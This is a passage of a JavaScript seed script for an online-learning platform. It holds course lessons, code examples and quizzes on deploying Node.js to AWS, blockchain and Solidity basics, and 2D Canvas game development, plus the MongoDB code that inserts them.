            content: `# Deploying a Node.js App to AWS

## Option 1: EC2 (Virtual Server)

\`\`\`bash
# 1. Launch EC2 instance (Ubuntu 22.04, t2.micro)
# 2. SSH into it
ssh -i your-key.pem ubuntu@your-ec2-ip

# 3. Install Node.js
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# 4. Install PM2 (process manager)
sudo npm install -g pm2

# 5. Clone and run your app
git clone https://github.com/you/pugi-backend.git
cd pugi-backend
npm install
npm run build

# 6. Start with PM2 (keeps app alive after crashes)
pm2 start dist/index.js --name pugi-backend
pm2 startup    # auto-start on reboot
pm2 save

# 7. Set up Nginx as reverse proxy
sudo apt install nginx
sudo nano /etc/nginx/sites-available/pugi
\`\`\`

\`\`\`nginx
server {
    listen 80;
    server_name your-domain.com;

    location / {
        proxy_pass http://localhost:3001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
\`\`\`

## Option 2: AWS Lambda (Serverless)

\`\`\`js
// handler.js — wrap your Express app for Lambda
const serverless = require('serverless-http');
const app = require('./src/app');

module.exports.handler = serverless(app);
\`\`\`

\`\`\`yaml
# serverless.yml
service: pugi-backend
provider:
  name: aws
  runtime: nodejs20.x
  region: us-east-1
  environment:
    MONGODB_URI: \${env:MONGODB_URI}
    JWT_SECRET: \${env:JWT_SECRET}

functions:
  api:
    handler: handler.handler
    events:
      - httpApi:
          path: /api/{proxy+}
          method: any
\`\`\`

\`\`\`bash
npm install -g serverless
serverless deploy
\`\`\`

## Option 3: S3 + CloudFront (Frontend)

\`\`\`bash
# Build frontend
npm run build

# Upload to S3
aws s3 sync dist/ s3://pugi-frontend --delete

# CloudFront serves it globally with HTTPS
# Set up in AWS Console: CloudFront → Create Distribution → S3 origin
\`\`\``,
            codeExample: `# Complete deployment script for PUGI backend on EC2
#!/bin/bash
set -e

APP_DIR="/home/ubuntu/pugi-backend"
REPO_URL="https://github.com/yourusername/pugi-backend.git"

echo "Starting deployment..."

# Pull latest code
if [ -d "$APP_DIR" ]; then
  cd $APP_DIR
  git pull origin main
else
  git clone $REPO_URL $APP_DIR
  cd $APP_DIR
fi

# Install and build
npm ci --only=production
npm run build

# Restart with PM2
if pm2 list | grep -q "pugi-backend"; then
  pm2 restart pugi-backend
else
  pm2 start dist/index.js --name pugi-backend
  pm2 save
fi

echo "Deployment complete!"
pm2 status`,
          },
        ],
        quiz: {
          title: 'Cloud Computing Quiz',
          passingScore: 70,
          maxAttempts: 3,
          questions: [
            {
              prompt: 'What does IaaS stand for?',
              options: [
                'Internet as a Service',
                'Infrastructure as a Service',
                'Integration as a Service',
                'Instance as a Service',
              ],
              correctOptionIndex: 1,
              explanation: 'IaaS provides virtualised computing infrastructure over the internet.',
              points: 1,
            },
            {
              prompt: 'Which AWS service is used for object storage (files, images)?',
              options: ['EC2', 'RDS', 'S3', 'Lambda'],
              correctOptionIndex: 2,
              explanation: 'S3 (Simple Storage Service) stores any type of file as objects in buckets.',
              points: 1,
            },
            {
              prompt: 'What is an AWS Availability Zone?',
              options: [
                'A country where AWS operates',
                'An isolated data centre within a region',
                'A type of EC2 instance',
                'A pricing tier',
              ],
              correctOptionIndex: 1,
              explanation: 'AZs are isolated data centres within a region, used for high availability.',
              points: 1,
            },
          ],
        },
      },
    ],
  },

  // ── BLOCKCHAIN ────────────────────────────────────────────────────────────
  {
    title: 'Blockchain & Web3 Fundamentals',
    description: 'Understand blockchain technology, smart contracts, and Web3. Learn how to build decentralized applications with Solidity and Ethereum.',
    thumbnail: 'https://placehold.co/600x340/6366f1/fff?text=Blockchain',
    category: 'Blockchain',
    level: 'intermediate',
    duration: '12 hours',
    rating: 4.5,
    status: 'published',
    modules: [
      {
        title: 'Blockchain Fundamentals',
        order: 0,
        lessons: [
          {
            title: 'How Blockchain Works',
            duration: '25 min',
            type: 'content',
            order: 0,
            content: `# How Blockchain Works

A blockchain is a distributed ledger — a record of transactions shared across thousands of computers with no central authority.

## The problem blockchain solves

\`\`\`
Traditional (Centralized):
Alice wants to send Bob $100
→ Alice's bank debits $100
→ Bob's bank credits $100
→ Both trust the banks to do this honestly

Problem: Banks can fail, freeze accounts, or be corrupt

Blockchain (Decentralized):
Alice sends Bob 1 ETH
→ Transaction broadcast to thousands of nodes
→ Nodes verify the transaction is valid
→ Transaction added to a block
→ Block added to the chain
→ No single point of failure or control
\`\`\`

## How a block works

\`\`\`
Block #1842
├── Previous Hash: 0x00000abc...
├── Timestamp: 2024-01-15 09:23:11
├── Transactions:
│   ├── Alice → Bob: 1.5 ETH
│   ├── Carol → Dave: 0.3 ETH
│   └── Eve → Frank: 2.1 ETH
├── Merkle Root: 0xdef456...
└── Hash: 0x000001ab...  ← Must start with zeros (proof of work)
\`\`\`

## Why it's tamper-proof

\`\`\`
Change any data in Block #1842
→ Hash of Block #1842 changes
→ Block #1843's "Previous Hash" no longer matches
→ All subsequent blocks are invalid
→ Attack rejected by the network
\`\`\`

## Consensus mechanisms

\`\`\`
Proof of Work (Bitcoin):
- Miners compete to solve mathematical puzzles
- Winner adds the next block, earns reward
- Energy intensive but battle-tested

Proof of Stake (Ethereum):
- Validators stake ETH as collateral
- Randomly selected to propose blocks
- Dishonest validators lose their stake
- 99.9% less energy than PoW
\`\`\`

## Key concepts

- **Wallet** — stores your private/public keys (not the crypto itself)
- **Private key** — secret key used to sign transactions
- **Public key/address** — shareable identifier (like your bank account number)
- **Gas** — fee paid to process Ethereum transactions
- **Smart contract** — self-executing code deployed on the blockchain
- **DeFi** — decentralized finance applications
- **NFT** — non-fungible token (unique digital asset)
- **Web3** — the decentralized internet built on blockchain`,
            codeExample: `// Implementing a simple blockchain in JavaScript
const crypto = require('crypto');

class Block {
  constructor(index, transactions, previousHash = '') {
    this.index         = index;
    this.timestamp     = Date.now();
    this.transactions  = transactions;
    this.previousHash  = previousHash;
    this.nonce         = 0;
    this.hash          = this.calculateHash();
  }

  calculateHash() {
    return crypto
      .createHash('sha256')
      .update(this.index + this.timestamp + this.previousHash +
              JSON.stringify(this.transactions) + this.nonce)
      .digest('hex');
  }

  mine(difficulty) {
    const target = '0'.repeat(difficulty);
    while (!this.hash.startsWith(target)) {
      this.nonce++;
      this.hash = this.calculateHash();
    }
    console.log(\`Block mined: \${this.hash}\`);
  }
}

class Blockchain {
  constructor() {
    this.chain      = [this.createGenesis()];
    this.difficulty = 3;
  }

  createGenesis() {
    return new Block(0, 'Genesis Block', '0');
  }

  addBlock(transactions) {
    const prev  = this.chain[this.chain.length - 1];
    const block = new Block(this.chain.length, transactions, prev.hash);
    block.mine(this.difficulty);
    this.chain.push(block);
  }

  isValid() {
    for (let i = 1; i < this.chain.length; i++) {
      const curr = this.chain[i];
      const prev = this.chain[i - 1];
      if (curr.hash !== curr.calculateHash()) return false;
      if (curr.previousHash !== prev.hash) return false;
    }
    return true;
  }
}

const chain = new Blockchain();
chain.addBlock([{ from: 'Alice', to: 'Bob', amount: 50 }]);
chain.addBlock([{ from: 'Bob',   to: 'Carol', amount: 25 }]);
console.log('Chain valid:', chain.isValid());`,
          },
          {
            title: 'Smart Contracts with Solidity',
            duration: '30 min',
            type: 'content',
            order: 1,
            content: `# Smart Contracts with Solidity

Smart contracts are programs that run on the blockchain. Once deployed they execute automatically when conditions are met — no middleman needed.

## Solidity basics

\`\`\`solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract SimpleStorage {
    uint256 private storedValue;
    address public owner;

    event ValueChanged(uint256 newValue, address changedBy);

    constructor() {
        owner = msg.sender;  // person who deployed the contract
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    function set(uint256 value) public onlyOwner {
        storedValue = value;
        emit ValueChanged(value, msg.sender);
    }

    function get() public view returns (uint256) {
        return storedValue;
    }
}
\`\`\`

## ERC-20 Token (simplified)

\`\`\`solidity
pragma solidity ^0.8.19;

contract PUGIToken {
    string  public name     = "PUGI Token";
    string  public symbol   = "PUGI";
    uint8   public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(uint256 initialSupply) {
        totalSupply        = initialSupply * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to]         += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}
\`\`\`

## Interacting with contracts from JavaScript

\`\`\`js
import { ethers } from 'ethers';

const provider = new ethers.BrowserProvider(window.ethereum);
const signer   = await provider.getSigner();

const contract = new ethers.Contract(
  CONTRACT_ADDRESS,
  CONTRACT_ABI,
  signer
);

// Read (free)
const value = await contract.get();
console.log('Stored value:', value.toString());

// Write (costs gas)
const tx = await contract.set(42);
await tx.wait(); // wait for confirmation
console.log('Transaction confirmed:', tx.hash);
\`\`\``,
            codeExample: `// Full dApp interaction example
import { ethers } from 'ethers';

const ABI = [
  "function set(uint256 value) public",
  "function get() public view returns (uint256)",
  "event ValueChanged(uint256 newValue, address changedBy)"
];

async function connectWallet() {
  if (!window.ethereum) {
    alert('Please install MetaMask!');
    return;
  }

  const provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send('eth_requestAccounts', []);
  const signer  = await provider.getSigner();
  const address = await signer.getAddress();

  console.log('Connected:', address);
  return { provider, signer };
}

async function readValue(contractAddress) {
  const { provider } = await connectWallet();
  const contract = new ethers.Contract(contractAddress, ABI, provider);
  const value    = await contract.get();
  console.log('Current value:', value.toString());
  return value;
}

async function writeValue(contractAddress, newValue) {
  const { signer } = await connectWallet();
  const contract   = new ethers.Contract(contractAddress, ABI, signer);

  console.log('Sending transaction...');
  const tx = await contract.set(newValue);

  console.log('Waiting for confirmation...');
  const receipt = await tx.wait();
  console.log('Confirmed in block:', receipt.blockNumber);
}`,
          },
        ],
        quiz: {
          title: 'Blockchain Quiz',
          passingScore: 70,
          maxAttempts: 3,
          questions: [
            {
              prompt: 'What makes a blockchain tamper-proof?',
              options: [
                'It is stored on a secure central server',
                'Changing any block invalidates all subsequent blocks, rejected by the network',
                'It uses a password to protect data',
                'Only the owner can modify the data',
              ],
              correctOptionIndex: 1,
              explanation: 'Each block contains the previous block\'s hash, so any change breaks the entire chain.',
              points: 1,
            },
            {
              prompt: 'What is a smart contract?',
              options: [
                'A legal agreement between two companies',
                'A type of cryptocurrency wallet',
                'Self-executing code deployed on the blockchain that runs automatically when conditions are met',
                'A centralized payment processor',
              ],
              correctOptionIndex: 2,
              explanation: 'Smart contracts are programs on the blockchain that execute automatically without intermediaries.',
              points: 1,
            },
            {
              prompt: 'What is "gas" in Ethereum?',
              options: [
                'The native cryptocurrency of Ethereum',
                'A fee paid to compensate for the computing energy required to process transactions',
                'A type of smart contract',
                'The speed of a transaction',
              ],
              correctOptionIndex: 1,
              explanation: 'Gas is the fee paid to validators for processing and storing transactions on Ethereum.',
              points: 1,
            },
          ],
        },
      },
    ],
  },

  // ── GAME DEV ──────────────────────────────────────────────────────────────
  {
    title: 'Game Development with JavaScript',
    description: 'Build 2D games from scratch using HTML5 Canvas and JavaScript. Learn game loops, physics, collision detection, and sprite animation.',
    thumbnail: 'https://placehold.co/600x340/16a34a/fff?text=Game+Dev',
    category: 'Game Dev',
    level: 'intermediate',
    duration: '13 hours',
    rating: 4.8,
    status: 'published',
    modules: [
      {
        title: 'Canvas and Game Loop',
        order: 0,
        lessons: [
          {
            title: 'HTML5 Canvas Fundamentals',
            duration: '25 min',
            type: 'content',
            order: 0,
            content: `# HTML5 Canvas Fundamentals

The HTML5 Canvas API lets you draw graphics directly in the browser using JavaScript — perfect for 2D games.

## Setting up canvas

\`\`\`html
<canvas id="gameCanvas" width="800" height="600"></canvas>
\`\`\`

\`\`\`js
const canvas = document.getElementById('gameCanvas');
const ctx    = canvas.getContext('2d');

// Responsive canvas
canvas.width  = window.innerWidth;
canvas.height = window.innerHeight;
\`\`\`

## Drawing shapes

\`\`\`js
// Rectangle
ctx.fillStyle   = '#3b82f6';
ctx.fillRect(50, 50, 100, 60);   // x, y, width, height

// Outline rectangle
ctx.strokeStyle = '#1d4ed8';
ctx.lineWidth   = 2;
ctx.strokeRect(50, 50, 100, 60);

// Circle
ctx.beginPath();
ctx.arc(200, 200, 40, 0, Math.PI * 2);  // x, y, radius, startAngle, endAngle
ctx.fillStyle = '#ef4444';
ctx.fill();

// Line
ctx.beginPath();
ctx.moveTo(0, 0);
ctx.lineTo(400, 300);
ctx.strokeStyle = '#10b981';
ctx.lineWidth   = 3;
ctx.stroke();

// Text
ctx.fillStyle = '#111827';
ctx.font      = '24px Arial';
ctx.fillText('Score: 100', 20, 40);
\`\`\`

## The game loop

The game loop runs 60 times per second, updating and redrawing everything:

\`\`\`js
function gameLoop(timestamp) {
  // 1. Clear the canvas
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  // 2. Update game state
  update(timestamp);

  // 3. Draw everything
  draw();

  // 4. Schedule next frame
  requestAnimationFrame(gameLoop);
}

// Start the loop
requestAnimationFrame(gameLoop);
\`\`\`

## Delta time — frame-rate independent movement

\`\`\`js
let lastTime = 0;

function gameLoop(timestamp) {
  const deltaTime = (timestamp - lastTime) / 1000; // seconds
  lastTime = timestamp;

  // Move at 200 pixels per second regardless of frame rate
  player.x += player.speed * deltaTime;

  ctx.clearRect(0, 0, canvas.width, canvas.height);
  draw();
  requestAnimationFrame(gameLoop);
}
\`\`\``,
            codeExample: `// Complete bouncing ball demo
const canvas = document.getElementById('canvas');
const ctx    = canvas.getContext('2d');
canvas.width  = 600;
canvas.height = 400;

const ball = {
  x: 300, y: 200,
  vx: 200, vy: 150,   // pixels per second
  radius: 20,
  color: '#3b82f6',
};

const paddle = {
  x: 250, y: 360,
  width: 100, height: 12,
  color: '#1d4ed8',
};

let score   = 0;
let lastTime = 0;

document.addEventListener('mousemove', (e) => {
  const rect = canvas.getBoundingClientRect();
  paddle.x   = e.clientX - rect.left - paddle.width / 2;
});

function update(dt) {
  ball.x += ball.vx * dt;
  ball.y += ball.vy * dt;

  if (ball.x - ball.radius < 0 || ball.x + ball.radius > canvas.width)  ball.vx *= -1;
  if (ball.y - ball.radius < 0) ball.vy *= -1;
  if (ball.y + ball.radius > canvas.height) { ball.y = 200; ball.vy = 150; }

  // Paddle collision
  if (ball.y + ball.radius >= paddle.y &&
      ball.x >= paddle.x &&
      ball.x <= paddle.x + paddle.width) {
    ball.vy = -Math.abs(ball.vy);
    score++;
  }
}

function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  ctx.beginPath();
  ctx.arc(ball.x, ball.y, ball.radius, 0, Math.PI * 2);
  ctx.fillStyle = ball.color;
  ctx.fill();

  ctx.fillStyle = paddle.color;
  ctx.fillRect(paddle.x, paddle.y, paddle.width, paddle.height);

  ctx.fillStyle = '#111827';
  ctx.font      = '20px Arial';
  ctx.fillText('Score: ' + score, 10, 30);
}

function loop(ts) {
  const dt = Math.min((ts - lastTime) / 1000, 0.05);
  lastTime = ts;
  update(dt);
  draw();
  requestAnimationFrame(loop);
}

requestAnimationFrame(loop);`,
          },
          {
            title: 'Collision Detection and Physics',
            duration: '28 min',
            type: 'content',
            order: 1,
            content: `# Collision Detection and Physics

## AABB Collision (rectangles)

Axis-Aligned Bounding Box — the most common collision check for 2D games:

\`\`\`js
function rectCollide(a, b) {
  return (
    a.x < b.x + b.width  &&
    a.x + a.width  > b.x &&
    a.y < b.y + b.height &&
    a.y + a.height > b.y
  );
}

// Usage:
if (rectCollide(player, enemy)) {
  player.health -= enemy.damage;
}
\`\`\`

## Circle collision

\`\`\`js
function circleCollide(a, b) {
  const dx   = a.x - b.x;
  const dy   = a.y - b.y;
  const dist = Math.sqrt(dx * dx + dy * dy);
  return dist < a.radius + b.radius;
}
\`\`\`

## Simple gravity and jumping

\`\`\`js
const GRAVITY = 800; // pixels per second squared

class Player {
  constructor() {
    this.x       = 100;
    this.y       = 300;
    this.vx      = 0;
    this.vy      = 0;
    this.width   = 32;
    this.height  = 48;
    this.onGround = false;
  }

  update(dt, platforms) {
    // Apply gravity
    if (!this.onGround) {
      this.vy += GRAVITY * dt;
    }

    // Move
    this.x += this.vx * dt;
    this.y += this.vy * dt;

    // Platform collision
    this.onGround = false;
    for (const plat of platforms) {
      if (rectCollide(this, plat)) {
        if (this.vy > 0) {
          this.y      = plat.y - this.height;
          this.vy     = 0;
          this.onGround = true;
        }
      }
    }
  }

  jump() {
    if (this.onGround) {
      this.vy = -600; // jump velocity
    }
  }
}
\`\`\`

## Keyboard input

\`\`\`js
const keys = {};
window.addEventListener('keydown', e => keys[e.code] = true);
window.addEventListener('keyup',   e => keys[e.code] = false);

function handleInput(player) {
  player.vx = 0;
  if (keys['ArrowLeft']  || keys['KeyA']) player.vx = -200;
  if (keys['ArrowRight'] || keys['KeyD']) player.vx = +200;
  if (keys['ArrowUp']    || keys['KeyW'] || keys['Space']) player.jump();
}
\`\`\``,
            codeExample: `// Mini platformer game
const canvas = document.getElementById('canvas');
const ctx    = canvas.getContext('2d');
canvas.width = 600; canvas.height = 400;

const keys = {};
window.addEventListener('keydown', e => { keys[e.code] = true;  e.preventDefault(); });
window.addEventListener('keyup',   e => { keys[e.code] = false; });

const GRAVITY = 900;

const platforms = [
  { x: 0,   y: 360, width: 600, height: 40 },
  { x: 150, y: 280, width: 120, height: 16 },
  { x: 350, y: 220, width: 120, height: 16 },
];

const player = { x: 50, y: 300, vx: 0, vy: 0, width: 28, height: 36, onGround: false };
const coins  = [{ x: 190, y: 250, r: 10 }, { x: 390, y: 190, r: 10 }];
let score = 0;

function rectCollide(a, b) {
  return a.x < b.x+b.width && a.x+a.width > b.x && a.y < b.y+b.height && a.y+a.height > b.y;
}

function update(dt) {
  player.vx = keys['ArrowLeft']||keys['KeyA'] ? -220 : keys['ArrowRight']||keys['KeyD'] ? 220 : 0;
  if ((keys['ArrowUp']||keys['Space']||keys['KeyW']) && player.onGround) player.vy = -580;
  if (!player.onGround) player.vy += GRAVITY * dt;
  player.x += player.vx * dt;
  player.y += player.vy * dt;
  player.onGround = false;
  for (const p of platforms) {
    if (rectCollide(player, p) && player.vy > 0) {
      player.y = p.y - player.height; player.vy = 0; player.onGround = true;
    }
  }
  for (let i = coins.length-1; i >= 0; i--) {
    const c = coins[i];
    const dx = player.x+14 - c.x, dy = player.y+18 - c.y;
    if (Math.sqrt(dx*dx+dy*dy) < c.r+14) { coins.splice(i,1); score += 10; }
  }
}

function draw() {
  ctx.clearRect(0,0,600,400);
  ctx.fillStyle='#e0f2fe'; ctx.fillRect(0,0,600,400);
  platforms.forEach(p => { ctx.fillStyle='#374151'; ctx.fillRect(p.x,p.y,p.width,p.height); });
  coins.forEach(c => { ctx.beginPath(); ctx.arc(c.x,c.y,c.r,0,Math.PI*2); ctx.fillStyle='#fbbf24'; ctx.fill(); });
  ctx.fillStyle='#3b82f6'; ctx.fillRect(player.x,player.y,player.width,player.height);
  ctx.fillStyle='#111'; ctx.font='18px Arial'; ctx.fillText('Score: '+score, 10, 28);
}

let last=0;
function loop(ts) { const dt=Math.min((ts-last)/1000,.05); last=ts; update(dt); draw(); requestAnimationFrame(loop); }
requestAnimationFrame(loop);`,
          },
        ],
        quiz: {
          title: 'Game Development Quiz',
          passingScore: 70,
          maxAttempts: 3,
          questions: [
            {
              prompt: 'What is the purpose of delta time in a game loop?',
              options: [
                'To limit the frame rate to 60fps',
                'To make movement frame-rate independent so the game runs consistently on all devices',
                'To calculate the score',
                'To detect collisions',
              ],
              correctOptionIndex: 1,
              explanation: 'Delta time ensures movement speed is consistent regardless of frame rate.',
              points: 1,
            },
            {
              prompt: 'Which function is used to schedule the next frame in a browser game loop?',
              options: ['setInterval', 'setTimeout', 'requestAnimationFrame', 'setFrame'],
              correctOptionIndex: 2,
              explanation: 'requestAnimationFrame is optimised for animations and pauses when the tab is hidden.',
              points: 1,
            },
            {
              prompt: 'What does AABB stand for in collision detection?',
              options: [
                'Advanced Axis-Based Boundaries',
                'Axis-Aligned Bounding Box',
                'Automatic Asset Bounding Block',
                'Angular Animation Behaviour Base',
              ],
              correctOptionIndex: 1,
              explanation: 'AABB is the simplest and most common collision check for 2D rectangular objects.',
              points: 1,
            },
          ],
        },
      },
    ],
  },
];

const addCourses = async () => {
  await mongoose.connect(MONGO_URI);
  console.log('Connected to MongoDB');

  let added = 0;
  for (let i = 0; i < newCourses.length; i++) {
    const course = newCourses[i];
    const exists = await Course.findOne({ title: course.title });
    if (exists) {
      console.log(`Skipping (already exists): ${course.title}`);
      continue;
    }
    const tutor = tutors[i % tutors.length];
    await Course.create({
      ...course,
      instructor: tutor.name,
      instructorId: new mongoose.Types.ObjectId(tutor.id),
      enrolledStudents: [],
      enrolledCount: 0,
    });
    console.log(`Added: ${course.title}`);
    added++;
  }

  console.log(`\nDone! Added ${added} new courses.`);
  await mongoose.disconnect();
};

addCourses()
  .then(() => process.exit(0))
  .catch(err => { console.error(err); process.exit(1); });
